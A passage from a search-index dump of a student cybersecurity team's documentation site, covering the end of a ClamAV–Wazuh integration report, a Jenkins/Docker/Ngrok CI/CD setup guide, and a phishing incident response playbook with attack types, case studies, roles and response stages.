the Windows version, it cannot perform memory scanning in Linux. Thus, malware that resides in memory will not be detected by ClamAV. Future work should explore memory scanning tools and techniques, in particular Wazuh, which can, as an example, detect injection attacks (https://wazuh.com/blog/detecting-process-injection-attacks-with-wazuh/).  Moreover, during this task, YARA and ClamAV integration was explored. However, it appears that YARA rules can only be passed invidually to ClamAV's scanning tools. Hence, YARA and ClamAV integration is limited to searching for individual malware strains. On the other hand, however, YARA can be integrated with Wazuh scripts to perform matching for monitored directories. YARA and Wazuh integration should be explored by future teams to enhance the ClamAV solution.  ","version":"Next","tagName":"h2"},{"title":"6. References​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#6-references","content":" Installing ClamAV via DockerClamAV scanning optionsSyslog Docker driverAdding custom decoders ","version":"Next","tagName":"h2"},{"title":"Implementation Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Guide","content":"","keywords":"","version":"Next"},{"title":"CI/CD IMPLEMENTATION GUIDE​","type":1,"pageTitle":"Implementation Guide","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Guide#cicd-implementation-guide","content":" ","version":"Next","tagName":"h2"},{"title":"Introduction​","type":1,"pageTitle":"Implementation Guide","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Guide#introduction","content":" Continuous Integration and Continuous Deployment (CI/CD) are essential practices in modern software development, facilitating frequent integration of code changes and automating the deployment process. This document outlines the implementation of a CI/CD pipeline for an Express application utilizing tools such as Docker, Jenkins, Ngrok, and GitHub. The process ensures a streamlined workflow from code commit to deployment, enhancing efficiency and reliability. In the evolving landscape of software development, implementing an effective CI/CD pipeline is critical for ensuring continuous integration and delivery of software applications. This document provides a comprehensive overview of the tools and technologies used in the CI/CD pipeline implementation for an Express application, highlighting their significance and roles in the process.    ","version":"Next","tagName":"h3"},{"title":"Tools and Technologies​","type":1,"pageTitle":"Implementation Guide","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Guide#tools-and-technologies","content":" 1. Express​  Significance: Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications. It serves as the backbone of the application, offering a simple and efficient way to set up an HTTP server.  Role in the Pipeline: Express is used to create the application's core structure, providing endpoints for testing and verifying the functionality of the CI/CD pipeline. Its simplicity and compatibility with Node.js make it an ideal choice for rapid development and deployment.    2. Docker​  Significance: Docker is a platform that enables developers to automate the deployment of applications inside lightweight, portable containers. Containers include all the dependencies required for an application to run, ensuring consistency across different environments.  Role in the Pipeline: Docker is used to containerize both the Express application and Jenkins server, providing an isolated environment for each component. This containerization ensures that the application runs consistently across development, testing, and production environments, reducing compatibility issues.    3. Jenkins​  Significance: Jenkins is an open-source automation server that facilitates the automation of building, testing, and deploying software. It supports continuous integration and continuous delivery practices, enabling developers to quickly integrate changes and deploy applications.  Role in the Pipeline: Jenkins is the core tool for automating the CI/CD pipeline. It is responsible for executing build scripts, running tests, and deploying the application to the desired environment. Jenkins integrates seamlessly with version control systems like GitHub, allowing automatic triggers for builds upon code changes.    4. Ngrok​  Significance: Ngrok is a tool that exposes local servers to the internet through secure tunnels. It is commonly used for testing webhooks and integrating local applications with third-party services.  Role in the Pipeline: Ngrok is used to create a public URL for the Jenkins server running on localhost. This setup allows GitHub webhooks to communicate with Jenkins, triggering the CI/CD pipeline remotely whenever changes are pushed to the repository.    5. GitHub​  Significance: GitHub is a web-based platform for version control and collaboration, using Git for managing code repositories. It is widely used for hosting open-source and private projects, providing tools for code review and collaboration.  Role in the Pipeline: GitHub serves as the version control system for the project's codebase. The integration between GitHub and Jenkins is crucial for automating the build and deployment process. Webhooks are conimpd in GitHub to notify Jenkins of any code changes, triggering the CI/CD pipeline.    6. Chocolatey​  Significance: Chocolatey is a package manager for Windows that simplifies the installation and management of software packages. It automates the setup process, ensuring that all required dependencies are installed with minimal effort.  Role in the Pipeline: Chocolatey is used to install the necessary tools and dependencies required for the CI/CD pipeline, such as Docker and Jenkins. It ensures that the environment is set up quickly and consistently across different machines.  Why did I use Chocolatey: I used Chocolatey to install both Ngrok and Docker on the Windows system, significantly simplifying the installation process by automating the download, setup, and dependency management. Without Chocolatey, installing Ngrok and Docker would involve manual downloading, configuring environment variables, and addressing potential dependency conflicts.    ","version":"Next","tagName":"h3"},{"title":"Step-by-Step Guide to Execute the CI/CD Pipeline​","type":1,"pageTitle":"Implementation Guide","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Guide#step-by-step-guide-to-execute-the-cicd-pipeline","content":" Prerequisites​  Before starting, ensure you have the following installed on your system:  Node.js and npm: To run the Express application.Docker: To containerize applications and run Jenkins.Ngrok: To create secure tunnels to localhost.Git: For version control.Jenkins: Installable via Docker.Chocolatey: (Windows users) To manage installations.    Step 1: Set Up the Express Application​  Why is it Important? Setting up the Express application provides the foundational structure for testing and verifying the CI/CD pipeline, ensuring that the pipeline is functional before scaling or adding complexity.  Initialize a Node.js Project:    Install Express:    Create index.js: Create a file named index.js and add the following code:    Update package.json: Ensure your package.json has a start script:      Step 2: Set Up Docker and Jenkins​  Why is it Important? Docker containerizes the application and Jenkins server, ensuring consistency across development, testing, and production environments. This minimizes potential compatibility issues that can arise when deploying applications in different environments.  Install Docker: Follow the instructions from Docker's official site to install Docker.Run Jenkins in Docker:    Access Jenkins: Open your browser and go to http://localhost:8080.      Step 3: Conimp GitHub and Jenkins Integration​  Why is it Important? Integrating GitHub with Jenkins automates the build and deployment process, enabling continuous integration and delivery with minimal manual intervention. This integration ensures that the pipeline responds automatically to code changes, maintaining continuous development and deployment.  Create a GitHub Repository: Push your Express application code to a new GitHub repository.Set Up Jenkins Credentials: In Jenkins, navigate to Manage Jenkins &gt; Manage Credentials. Add a new credential for GitHub access (if required).    Install GitHub Plugin in Jenkins: Go to Manage Jenkins &gt; Manage Plugins. Install the &quot;GitHub Integration Plugin&quot; and &quot;GitHub Plugin&quot;.    Create a Jenkins Job: Create a new pipeline job in Jenkins. Conimp the GitHub repository URL in the Source Code Management section. Add build steps to install dependencies and run tests.      Step 4: Set Up Ngrok for Webhook​  Why is it Important? Ngrok is used to expose Jenkins running locally to the internet, enabling remote GitHub webhooks to trigger the CI/CD pipeline. This setup is crucial for automated responses to code changes from GitHub, ensuring seamless integration and continuous deployment.  Install Ngrok: Download and install Ngrok from its official site: https://ngrok.com.Expose Jenkins with Ngrok: Note the Forwarding URL (e.g., https://&lt;random-id&gt;.ngrok.io).      Step 5: Conimp GitHub Webhook​  Why is it Important? Configuring a webhook in GitHub is essential for automating the CI/CD pipeline. It ensures that Jenkins is automatically notified of code changes, triggering the pipeline to run builds and tests without manual intervention.  Add Webhook to GitHub: Go to your GitHub repository, navigate to Settings &gt; Webhooks &gt; Add webhook, and enter the Ngrok forwarding URL followed by /github-webhook/ (e.g., https://&lt;random-id&gt;.ngrok.io/github-webhook/).      Step 6: Define the Jenkins Pipeline​  Why is it Important? Defining the Jenkins pipeline through a Jenkinsfile provides a version-controlled, automated blueprint for building, testing, and deploying the application. This enhances reproducibility and scalability of the CI/CD process.  Create a Jenkinsfile in the Repository:      Step 7: Verify the Pipeline Execution​  Why is it Important? Verifying the pipeline execution ensures that the CI/CD process is functioning as intended, with all stages successfully completed. Monitoring logs and build stages is crucial for identifying and troubleshooting any issues that arise during the deployment process.  Check Jenkins for Pipeline Execution: Access Jenkins to verify that the pipeline is triggered by GitHub push events. Monitor the build stages and logs for successful execution.      ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Implementation Guide","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Guide#references","content":" Docker 2024. Docker Documentation. Available at: https://docs.docker.com/. ","version":"Next","tagName":"h3"},{"title":"Phishing Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#1-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#11overview","content":" One of the most common, simple yet dangerous security threats that all types of companies now must deal with are phishing emails. The confidentiality, integrity, and availability of vital assets and data are seriously jeopardised by these attacks. Organisations need to have a thorough and well-defined incident response policy in place to effectively counter this danger while adhering to the minimum actions and questions to be carried out as detailed in the Redback Operations Incident Response Policy.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#12purpose","content":" This playbook's main goal is to give organisation an organised, methodical strategy to identifying, stopping, and minimising the effects of phishing assaults. Its objectives are to help Computer Security Incident Response Team (CSIRT) teams avoid operational disruptions, secure sensitive data, respond quickly to phishing attacks, and preserve the organization's reputation. The playbook provides precise instructions and protocols for phishing attack preparation, detection, analysis, containment, eradication, discovery, and post-event actions. By adhering to the playbook's guidelines, an organisation can improve its incident response capabilities, quickly and effectively combat phishing threats, and solidify itself against changing cyberthreats in the modern digital landscape.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#13-attack-definition","content":" Phishing is defined as the deceptive activity of someone pretending to be a reputable organization and sending emails, texts, or phone calls to trick people into disclosing sensitive information, including passwords, banking and credit card details, and personally identifiable information. These fraudulent communications often include links to fake websites or harmful attachments that aim to infect the recipient's device with malware or steal personal information. Phishing attacks pose a serious risk to cybersecurity and data privacy by utilizing social engineering tactics to trick individuals.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#14scope","content":" The scope of this playbook includes the handling of phishing attacks, covering post-event actions, coordination, communication, incident detection, response, and continuous improvement initiatives. The goal is to assist CSIRT teams in efficiently identifying, evaluating, and countering phishing attacks while minimizing damage to the company's assets and operations. The playbook also aims to enhance communication and collaboration among stakeholders during a phishing event and is intended for use by everyone involved in phishing incident management.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#2-attack-types","content":" The different types of phishing attacks include:  ","version":"Next","tagName":"h2"},{"title":"2.1 Email Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#21-email-phishing","content":" This is the most common type of phishing attack, in which hackers send fraudulent emails to people or businesses pretending to be trustworthy organisations like banks, governments, or well-known corporations. Usually, these emails have harmful attachments or links that are meant to fool recipients into downloading malware or disclosing private information.    Signs of Email Phishing:  Requests for personal information: Reputable businesses will never send you an email requesting personal information. Urgent issue: Exercise caution when you receive urgent notifications, such as failed payments or account breaches. To verify, visit the website/ call bank directly rather than clicking any links. Shortened links: Be wary of condensed or shortened links since they could be hiding harmful URLs. Fourth-party email addresses: Verify the integrity of the sender email address; scammers frequently use aliases or other versions of reputable domains. Spelling and grammar issues: Any email that has misspellings or grammar faults should be taken seriously as it may be a sign of phishing. File attachments: Stay away from opening attachments unless they have been confirmed, especially if they have the.exe,.zip, or .scr extensions. Sigle or blank image: Emails with just an image or one blank picture should be avoided since they can include malware that starts downloading automatically. Case Study: Google and Facebook (2013-2015) Overview: A Lithuanian man tricked Google and Facebook employees into wiring over $100 million by sending fake invoices and pretending to be a hardware vendor.Signs of Activity: The invoices appeared legitimate and were sent from fake email addresses that closely resembled the real vendor’s address.Impact: Google and Facebook eventually recovered the funds, but the case highlighted the effectiveness of sophisticated email phishing.Response: Increased awareness training for employees and stricter verification processes for invoices and payment requests.  ","version":"Next","tagName":"h3"},{"title":"2.2 Spear Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#22-spear-phishing","content":" Spear phishing consists of extremely focused attacks directed at particular people or departments within a company. To create phishing emails that are more likely to be successful, attackers perform in-depth research to obtain personal information about their targets.    Signs of Spear Phishing:  Unusual requests: To prevent possible scams, confirm through a different channel if coworkers ask for credentials beyond the scope of their position. Shared drive links: Stay away from accessing links that appear to be from internal sources since you probably already have access to shared drives. Unsolicited emails: Be wary of emails offering unsolicited downloads; always verify the sender's authenticity. Personal information: Email scammers may utilise needless personal information to win your trust, so be cautious when responding to such mail. Case Study: U.S. Democratic National Committee (2016) Overview: Russian hackers used spear phishing emails to gain access to the DNC’s computer network and steal sensitive information.Signs of Activity: Highly targeted emails that appeared to be from trusted sources, containing malicious links.Impact: Significant political fallout and disruption during the 2016 presidential election.Response: Improved email security measures, employee training, and enhanced monitoring for suspicious activities.  ","version":"Next","tagName":"h3"},{"title":"2.3 Whaling​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#23-whaling","content":" Whaling attacks, sometimes referred to as CEO fraud, targets high-profile individuals in an organisation, such as CEOs or senior managers, with the intention of committing financial fraud or stealing confidential data. These attacks may spoof reliable connections or business partners and frequently entail advanced social engineering techniques.    Signs of Whaling:  Inaccurate domain address: To trick people, scammers frequently utilise identical but false domain domains. While checking email addresses, exercise caution. Use of personal email: To reduce the danger of phishing, only use professional emails to communicate with executives or business partners. Verify the sender's identification over an offline channel if the request occurs from a personal email. Requests for new contacts: Be wary of emails from vendors or partners you are not familiar with. Check these messages via proper channels or get in touch with the person in charge directly. Case Study: Crelan Bank (2016) Overview: The Belgian bank lost over $75 million due to a whaling attack where attackers impersonated the CEO and requested a large wire transfer.Signs of Activity: Emails appearing to come from the CEO, urgent requests for wire transfers.Impact: Significant financial loss and reputational damage.Response: Stricter verification processes for high-value transactions and increased training for executives on identifying phishing attempts.  ","version":"Next","tagName":"h3"},{"title":"2.4 Vishing (Voice Phishing)​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#24-vishing-voice-phishing","content":" This utilises voicemails or phone calls to trick people into divulging private information or carrying out specific tasks, such sending money or exposing up vulnerable networks. Attackers may pretend to be legitimate by using methods like caller ID spoofing.    Signs of Vishing:  Blocked or unidentified numbers: Phishing calls often originate from blocked numbers. If a caller sounds suspicious, hang up immediately. Requests for sensitive information or money: Various entities such as Government organizations, Medicare centres and Financial institutions conduct business through official mail and never request personal information over phone calls. Case Study: IRS Scams (Ongoing) Overview: Attackers impersonate IRS agents and call individuals, threatening them with arrest if they do not pay alleged back taxes.Signs of Activity: Threatening phone calls from individuals claiming to be IRS agents, requests for immediate payment via unconventional methods.Impact: Significant financial losses for victims and ongoing public awareness issues.Response: Public awareness campaigns by the IRS, encouraging individuals to verify the legitimacy of such calls and report suspicious activities.  ","version":"Next","tagName":"h3"},{"title":"2.5 Smishing (SMS Phishing)​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#25-smishing-sms-phishing","content":" Text messages, or SMS (Short Message Service), are used in smishing attacks to deceive targets into clicking on harmful links or compromising personal information. These messages, which frequently appear to be from reliable sources like banks or government organisations, may advise recipients to act immediately to prevent repercussions.    Signs of Smishing:  Unsolicited texts: Watch out for texts that provide you discounts or freebies on something you didn't sign up for. Phishing texts may also ask for personal information or account verification. Unknown numbers: Exercise vigilance while sending information requests by text. For verification, use a free phone lookup service; stay away from links and other interactions. Authentication requests: Requests for authentication that are not authorised can be signs of attempted account access. To protect your account, quickly change your password. Case Study: Bank SMS Scam (2019) Overview: Attackers sent SMS messages pretending to be from a bank, asking recipients to click on a link to resolve a security issue with their account.Signs of Activity: Texts containing links to fake bank websites, urgent requests for account verification.Impact: Financial losses for victims who provided their banking information to the fake site.Response: Banks increased awareness campaigns and implemented better SMS filtering and detection technologies.  ","version":"Next","tagName":"h3"},{"title":"2.6 Clone Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#26-clone-phishing","content":" Clone phishing is the practice of copying and pasting authentic emails or messages, making little changes (like changing links or attachments), and then delivering them to targets pretending they were the original correspondence. This strategy tries to fool recipients into interacting with the malicious content by taking advantage of their familiarity with the original sender.    Signs of Clone Phishing:  Duplicate emails: Look for copies of emails and closely examine newly added links for any indications of phishing. Always cross-reference connections with earlier correspondence. Misspelt email addresses: Small typos are a common feature of bogus emails, which are sometimes overlooked. Text with hyperlinks: Hover your cursor over links to see the actual URL. Should it diverge from the text that is linked, it can be a sign of phishing. Case Study: Dropbox (2014) Overview: Attackers cloned legitimate Dropbox emails, inserting malicious links to steal user credentials.Signs of Activity: Emails identical to official Dropbox communication but with malicious links.Impact: Compromised user accounts and data breaches.Response: Dropbox enhanced email security, user education, and implemented two-factor authentication.  ","version":"Next","tagName":"h3"},{"title":"2.7 Angler Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#27-angler-phishing","content":" Attackers that use social media to conduct angler phishing pose as customer service agents. They make up profiles and message unhappy persons they come across in posts or comments on social media. Once the fraudster has confirmed a few personal data, they offer help and a URL that claims to fix the problem. But the URL is infected with malware, which makes it possible to successfully exploit the victim.    Signs of Angler Phishing:  Unverified account: Official support pages are usually verified and linked directly to the main page. Check the company website for official support contacts. Minimal profile history: Smaller businesses, though unverified, should have a history of customer interactions. New accounts with few followers and no posts are likely attempting to deceive unsuspecting users. Case Study: British Airways (2018) Overview: Attackers posed as British Airways customer service on social media to steal personal information from customers.Signs of Activity: Fake customer service accounts, requests for personal information via direct messages.Impact: Compromised customer information and loss of trust.Response: British Airways improved social media monitoring and customer education on verifying legitimate accounts.  ","version":"Next","tagName":"h3"},{"title":"2.8 Evil twin phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#28-evil-twin-phishing","content":" Evil twin phishing involves creating a fraudulent Wi-Fi network that mimics a legitimate one, tricking users into connecting to it. Once connected, attackers can intercept sensitive information or deploy malware.    Signs of Evil twin phishing:  Duplicate Wi-Fi hotspots: If you see multiple Wi-Fi networks with the same name, connect only to the secured one requiring a password from the establishment. Connecting to unsecured networks is strongly discouraged for safety. Unsecure warnings: If your device warns that a network is unsecured, consider connecting to a secure network or refrain from connecting altogether. Case Study: Coffee Shop Incident (2019) Overview: Attackers set up an evil twin Wi-Fi network in a coffee shop, capturing data from users who connected to it.Signs of Activity: Multiple Wi-Fi networks with the same name, unsecure connection warnings.Impact: Stolen personal information and compromised accounts.Response: Increased public awareness about the dangers of connecting to unsecured Wi-Fi networks and encouraging the use of VPNs.     ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#3-stakeholders","content":" To minimise the impact on the organisation and prevent further events, early and efficient reaction to a phishing attack depends on strong coordination and collaboration amongst key stakeholders. Responding to a phishing attack usually involves the following key stakeholders:  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#31-it-security-team","content":" Lead: Daniel McAulay (Senior Project Leader)  Responsibilities:  Identifying, researching, and preventing phishing attacks.Leading technical response tasks such as phishing email analysis and malicious website blocking.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#32-incident-response-team","content":" Lead: Devika Sivakumar (Blue Team Leader)  Responsibilities:  Coordinating response efforts and communicating with relevant parties.Implementing incident response protocols and conducting post-incident analysis.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#33-communication-team","content":" Lead: Kaleb Bowen (Company Lead)  Responsibilities:  Managing internal and external communications regarding the phishing incident.Informing staff, clients, and other relevant parties about the response activities.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#34-customers","content":" Responsibilities:  Reporting suspicious activity.Following organizational guidelines to protect personal information.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#35-third-party-vendors","content":" Responsibilities:  Providing specialized knowledge and assistance during the response process.Complying with data security and privacy requirements.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart for Phishing Incident Response​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#raci-chart-for-phishing-incident-response","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tSenior Management\tLegal and Compliance\tCustomers\tThird-Party VendorsPreparation Establish incident response team\tR, C\tA, R\tI\tI\tC\tI\tI Develop response procedures\tA, R\tR, C\tI\tC\tC\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI\tI\tI Analysis Collect forensic data\tA, R\tR\tI\tI\tI\tI\tI Identify attack methods\tA, R\tR\tI\tI\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI\tI\tI Containment Isolate compromised systems\tA, R\tR\tI\tI\tI\tI\tI Implement access restrictions\tA, R\tR\tI\tI\tI\tI\tI Block malicious traffic\tA, R\tR\tI\tI\tI\tI\tI Eradication Remove malicious software\tA, R\tR\tI\tI\tI\tI\tI Patch vulnerabilities\tA, R\tR\tI\tI\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI\tI\tI Recovery Restore backups\tA, R\tR\tI\tI\tI\tI\tI Rebuild systems\tA, R\tR\tI\tI\tI\tI\tI Conduct user training\tA, R\tR\tI\tI\tI\tI\tI Post-Incident Review Review incident response\tA, R\tR\tI\tI\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI\tI\tI Update response procedures\tA, R\tR\tI\tI\tI\tI\tI Communication Create communication plans\tC\tC\tA, R\tI\tC\tI\tI Draft communication materials\tC\tC\tA, R\tI\tC\tI\tI Manage media relations\tC\tC\tA, R\tI\tC\tI\tI Provide updates\tC\tC\tA, R\tI\tC\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow Notify IT Security Analyst- The first thing to do is to alert the assigned IT security analyst as soon as you suspect a phishing attempt. To start the incident response procedure as soon as possible, the analyst must be notified. Important information including the threat's nature, the systems that are impacted, and any preliminary findings or proof are all included in this warning. Identification (Identify): Red Block Malicious Emails: As soon as the phishing attempt is verified, all incoming emails that are suspected of being fraudulent should be blocked. By taking this preventive step, users are protected from possible danger and more intrusion into the company's systems are prevented.Disconnect Affected Systems: Meanwhile, all suspected or verified hacked systems are unplugged from the network. The goal of this isolation phase is to reduce possible harm to other systems or data while containing the danger and preventing its spread. Notification (Notif): Violet Change Passwords for Compromised Accounts: Passwords for hacked user accounts are quickly changed as part of incident response to stop unwanted access. This preventive action reduces the possibility that malicious individuals will continue to abuse the situation.Scan Systems for Malware: The impacted computers are thoroughly scanned to find and eliminate any malware or harmful files. Through this scanning procedure, the systems' integrity is guaranteed, and any potential threats are stopped in their tracks.Review Malicious Links/Attachments: All attachments and URLs that might be connected to the phishing effort are carefully examined. This research provides light on the attackers' methodology and motivations in addition to helping to identify the strategies they employ.Blacklist Sender Domains/Addresses: Email addresses and sender domains connected to the phishing effort are blocked. Companies can actively fight against future attacks and protect customers from similar hazards by limiting communication from these sources.Inform Other Analysts of Repeated Attempts: Other security analysts are informed about the phishing effort, including attack tactics and indications of compromise (IOCs). This cooperative strategy strengthens protections against recurring threats and improves situational awareness. Containment (Contain): Sky Blue Error - Unable to Isolate Affected Systems: If isolating the compromised systems doesn't resolve the issue, a senior analyst is notified so they may investigate it more and take appropriate action. By taking this action, you may be confident that the right steps are done to limit the problem and stop it from getting worse.Escalate to Senior Analyst: To help in reaching a well-informed decision, the senior analyst is briefed on the circumstances and given relevant details. By elevating the issue, you can make sure that it gets the focus and resources it needs to be handled successfully. Eradication (Erad): Light Green Record Incident Details: Carefully documented are all the specifics of the happening, such as the timing, effects, and reaction activities. For post-event analysis, legal compliance, and future incident response planning, this material is an invaluable resource.Review Incident with Incident Response Team: Together with the incident response team, a thorough analysis of the occurrence is carried out. The objectives of this post-event study are to identify areas for incident response method improvement, security control gaps, and lessons learned. Recovery (Recover): Brown Continue Monitoring: Ongoing monitoring operations are restarted following the mitigation of the immediate threat and the incident. This entails keeping an eye on user activities, system records, and network traffic to spot any remaining dangers or illegal access. Post-Incident Actions (Post): Light pink Continue Monitoring: Even after the issue has been resolved, ongoing surveillance is still necessary to identify any reappearance of the danger or any fresh security flaws. To improve future issue handling skills, post-event steps should also involve a complete examination of incident response protocols and the implementation of any necessary enhancements.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#51-preparation","content":" Objective: Establish the foundation for an effective phishing incident response. Activities: Develop and document an incident response plan.Form an incident response team with defined roles and responsibilities.Conduct regular risk assessments.Implement security measures like antivirus programs, firewalls, and intrusion detection systems.Create and maintain backups of critical data.Conduct employee training and awareness campaigns.Establish communication channels for reporting and coordinating incidents. Outcome: A fully prepared organization capable of responding quickly and effectively to phishing incidents.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#52-detection","content":" **Objective*8: Identify indications of phishing attacks or unauthorized access. Activities: Monitor system logs and network traffic for unusual activity.Use IDS and SIEM tools to detect phishing attacks.Analyse alerts to differentiate between legitimate and malicious activity.Conduct regular security audits and scans to find vulnerabilities. Outcome: Early identification of phishing threats enables rapid response.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#53-analysis","content":" Objective: Determine the nature and scope of the phishing incident. Activities: Examine security events to assess the impact.Gather and analyse supporting documentation.Identify TTPs and IOCs of threat actors.Collaborate with IT departments, legal advisors, and law enforcement if needed.Document findings and maintain a chain of custody for evidence. Outcome: Comprehensive understanding of the phishing incident, including causes and effects.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#54-containment","content":" Objective: Stop further unauthorized access or data leakage. Activities: Isolate compromised systems from the network.Disable compromised user accounts or services.Implement interim solutions to mitigate the impact.Communicate containment efforts and expected downtime to relevant parties. Outcome: Effective handling of the phishing incident, minimizing damage.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#55-eradication","content":" Objective: Remove malicious elements and restore system integrity. Activities: Identify and remove malware from impacted systems.Fix security vulnerabilities.Perform thorough audits to ensure all compromises are eliminated.Restore systems from clean backups.Update security measures to prevent recurrence. Outcome: Complete removal of phishing threats and reduction of vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#56-recovery","content":" Objective: Restore normal operations while maintaining security. Activities: Test restored systems and applications.Communicate progress to all relevant parties.Conduct post-event evaluations to identify opportunities for improvement.Update incident response plans, policies, and training materials based on lessons learned. Outcome: Full recovery of services with enhanced security measures.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- 